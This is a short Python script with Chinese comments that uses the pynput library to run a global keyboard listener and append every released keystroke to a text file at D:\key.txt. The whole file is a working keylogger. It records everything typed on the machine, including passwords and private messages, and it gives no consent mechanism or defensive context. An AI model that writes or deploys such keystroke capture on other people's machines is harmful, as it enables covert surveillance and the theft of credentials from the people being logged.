from pynput.keyboard import Key,Listener
#按下键盘
def on_press(key):
    pass
#松开键盘
def on_release(key):
    flag = str(key).replace("'","")
#    print(flag)
    with open('D:\\key.txt','a') as f:
        f.write(flag)

with Listener(on_press=on_press,on_release=on_release) as Listener:
    Listener.join()
